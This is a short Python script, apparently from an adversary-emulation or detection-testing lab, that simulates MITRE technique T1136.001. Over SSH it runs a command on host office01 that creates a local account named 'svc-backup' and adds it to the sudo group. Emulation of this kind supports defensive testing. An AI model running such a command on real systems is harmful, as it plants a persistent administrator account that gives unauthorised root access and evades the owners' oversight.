"""T1136.001: an intruder on office01 adds a local account and makes it an admin."""

from attacks.mgmt import OFFICE01, ssh_run

ACCOUNT = "svc-backup"


def run() -> None:
    ssh_run(OFFICE01, f"sudo useradd -m -s /bin/bash {ACCOUNT} && sudo usermod -aG sudo {ACCOUNT}")
    print(f"  created {ACCOUNT} on office01 and added it to sudo")
